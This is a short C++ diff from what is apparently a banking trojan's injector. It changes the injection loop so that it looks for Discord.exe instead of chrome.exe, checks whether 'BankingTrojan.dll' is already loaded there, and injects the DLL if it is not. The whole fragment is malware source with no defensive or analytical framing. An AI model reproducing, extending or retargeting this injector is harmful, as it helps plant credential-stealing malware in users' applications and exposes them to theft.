@@ -95,7 +95,7 @@ void injectionLoop(char* dllPath){
         if (Process32First(hSnapshot, &pe)) {
             do {
                 std::string currentProcessName = pe.szExeFile;
-                if (currentProcessName == "chrome.exe" && IsDllLoadedInProcess(pe.th32ProcessID, "BankingTrojan.dll")) {
+                if (currentProcessName == "Discord.exe" && IsDllLoadedInProcess(pe.th32ProcessID, "BankingTrojan.dll")) {
                     hasdll = 1;
                 }
             } while (Process32Next(hSnapshot, &pe));
@@ -103,7 +103,7 @@ void injectionLoop(char* dllPath){
         if(!hasdll && Process32First(hSnapshot, &pe)){
             do {
                 std::string currentProcessName = pe.szExeFile;
-                if (currentProcessName == "chrome.exe") {
+                if (currentProcessName == "Discord.exe") {
                     inject(pe.th32ProcessID, dllPath);
                     break;
                 }
